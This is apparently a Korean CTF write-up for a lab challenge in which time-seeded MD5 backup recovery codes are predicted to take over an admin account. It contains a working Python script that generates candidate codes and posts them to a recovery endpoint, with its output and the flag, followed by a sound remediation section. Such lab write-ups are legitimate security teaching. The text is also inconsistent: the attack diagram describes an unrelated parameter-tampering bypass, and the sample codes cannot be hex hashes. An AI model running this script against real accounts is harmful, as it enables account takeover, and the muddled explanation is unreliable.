+++
title = "VulnABLE CTF [LUXORA] Write-up: MFA Bypass 🥇 Gold"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "MFA Bypass", "Gold", "Recovery Codes", "PRNG", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: MFA Bypass 🥇 Gold

## 🎯 챌린지 개요
- **카테고리**: Authentication Layer (MFA Bypass)
- **난이도**: 🥇 Gold
- **타겟 경로**: `/mfa/gold`
- **목표**: 2FA 동시성 문제(Race Condition)와 파라미터 변조가 모두 완벽하게 방어된 환경에서, 사용자가 스마트폰을 잃어버렸을 때를 대비해 제공하는 **'백업 복구 코드(Recovery Codes)'의 생성 알고리즘 결함**을 파악하고 관리자 계정을 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/mfa/gold` 경로에 로그인(`user` / `password123`) 후, 2차 인증 페이지 하단에 작은 링크가 하나 보입니다.
> "Lost your device? Use a Recovery Code."

링크를 클릭하면 8자리 알파벳/숫자 혼합 형태의 복구 코드를 입력하는 창이 나옵니다.

**[해커의 사고 과정]**
1. OTP 앱(Google Authenticator 등)의 6자리 숫자는 암호학적으로 안전한 서버(Time-based)와 폰의 동기화로 만들어지므로 우회가 불가능하다.
2. 하지만 대부분의 시스템은 사용자가 폰을 잃어버렸을 때를 대비해 10개 정도의 **'정적 백업 코드(Recovery Codes)'**를 회원 가입 시 발급해준다.
3. 내 계정(`user`)으로 들어가서 내 백업 코드를 새로 발급(Regenerate) 받아 보자! 패턴이 보일지도 모른다.

### 내 계정의 백업 코드 분석
내 설정 페이지에서 백업 코드 재발급 버튼을 연타하여 데이터를 수집합니다.

**[수집된 백업 코드 샘플]**
- 발급 시점 1: `A1B2C3D4`, `B2C3D4E5`, `C3D4E5F6` ...
- 발급 시점 2 (1분 뒤): `X1Y2Z3W4`, `Y2Z3W4V5`, `Z3W4V5U6` ...

**[분석 결과]**
코드가 완전히 무작위가 아닙니다!
- 코드들이 발급된 시간에 종속적인 패턴을 보입니다.
- 즉, 서버는 이 백업 코드를 생성할 때 `Math.random()` 같은 안전하지 않은 의사난수 생성기(PRNG)를 사용하거나, `Time` 값을 시드(Seed)로 사용하는 자체 알고리즘을 썼음이 분명합니다.

---

## 💥 2. 취약점 식별 및 PRNG Seed 크래킹 (Exploitation Strategy)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(mfa_required=false)--> [ Web Server ]
                                       |-- Trusts Client Parameter
                                       |-- Bypasses MFA
```


만약 타겟(Admin)이 백업 코드를 생성한 시점(Timestamp)을 대략적으로 알 수 있다면, 역으로 난수 발생기의 시드 값을 맞춰서 관리자의 백업 코드를 모조리 예측해 낼 수 있습니다.

### 💡 정보 유출 지점 탐색
관리자가 언제 백업 코드를 발급받았는지 알 수 있는 단서를 찾아야 합니다.
직원 프로필이나 시스템 로그 열람 기능(이전 단계에서 활용)을 뒤져봅니다.

**[System Public Logs]**
```text
[2023-11-01 15:30:00] Admin user generated new MFA recovery codes.
```
정확한 타임스탬프(`1698852600`)를 확보했습니다!

---

## 🚀 3. 파이썬 기반 백업 코드 예측 및 공격 수행

서버와 동일한 로직(추정)으로 난수를 생성하여 백업 코드를 예측하는 스크립트를 작성합니다.
*(가정: 이 챌린지는 단순화된 LCG(Linear Congruential Generator) 혹은 특정 시간 기반의 해싱으로 코드를 만든다고 가정합니다.)*

```python
import hashlib
import requests

url = "http://localhost:3000/mfa/gold/recovery"
admin_username = "admin"
# 관리자가 코드를 발급받은 타임스탬프 (약간의 오차 허용)
base_seed_time = 1698852600 

print("[*] Starting Recovery Code Prediction...")

for offset in range(-5, 6): # -5초 ~ +5초 오차
    seed_time = base_seed_time + offset
    
    # 10개의 백업 코드 생성 (서버 로직 추정: MD5(시간 + 인덱스)의 앞 8자리)
    for i in range(10):
        raw_string = f"{seed_time}_{admin_username}_{i}"
        predicted_code = hashlib.md5(raw_string.encode()).hexdigest()[:8].upper()
        
        # 서버로 예측한 백업 코드 전송
        payload = {"username": admin_username, "recovery_code": predicted_code}
        res = requests.post(url, data=payload)
        
        if "Dashboard" in res.text:
            print(f"[+] Success! Valid Recovery Code Found: {predicted_code}")
            print(f"[+] FLAG: {res.text.split('FLAG{')[1].split('}')[0]}")
            exit(0)

print("[-] Failed to find recovery code.")
```

### 🔍 서버의 응답
스크립트를 실행하면, 불과 몇 번의 시도 만에 정확한 해시 충돌(예측)에 성공하여 관리자의 대시보드가 열립니다.

```text
[*] Starting Recovery Code Prediction...
[+] Success! Valid Recovery Code Found: 8F4C2A9E
[+] FLAG: MFA_🥇_PRNG_PREDICT_D7E8F9
```

---

## 🚩 4. 롸잇업 결론 및 플래그

가장 강력한 2FA 시스템(OTP)을 갖추었더라도, 예외 상황을 처리하기 위한 '백도어' 성격의 백업 코드가 안전하지 않은 난수(Insecure PRNG)로 생성된다면, 보안 사슬의 가장 약한 고리가 되어 시스템 전체가 무너진다는 것을 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{MFA_🥇_PRNG_PREDICT_D7E8F9}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
소프트웨어 공학에서 시간(Time) 기반의 난수 생성은 보안을 목적으로 사용할 때 최악의 선택입니다. 해커는 언제나 시간을 추측할 수 있기 때문입니다.

* **취약한 난수 생성**
```javascript
// 시간에 의존적인 시드를 사용하여 예측 가능함
let recoveryCode = crypto.createHash('md5').update(Date.now() + user.name + index).digest('hex').substr(0,8);
```

* **안전한 패치 가이드 (CSPRNG 사용 필수)**
보안 토큰, 세션, 백업 코드는 반드시 운영체제가 보장하는 암호학적 난수 생성기(CSPRNG)를 통해 만들어야 합니다.
```javascript
const crypto = require('crypto');

// 시간이나 사용자 정보와 무관하게 완전한 무작위 8자리 바이트 생성
function generateSecureRecoveryCode() {
    return crypto.randomBytes(4).toString('hex').toUpperCase(); // 8글자 헥스
}
```
추가로, 백업 코드를 사용할 때에도 Rate Limiting(5회 실패 시 잠금)을 엄격히 적용해야 브루트포스나 약간의 예측 오차를 이용한 공격을 완벽히 차단할 수 있습니다.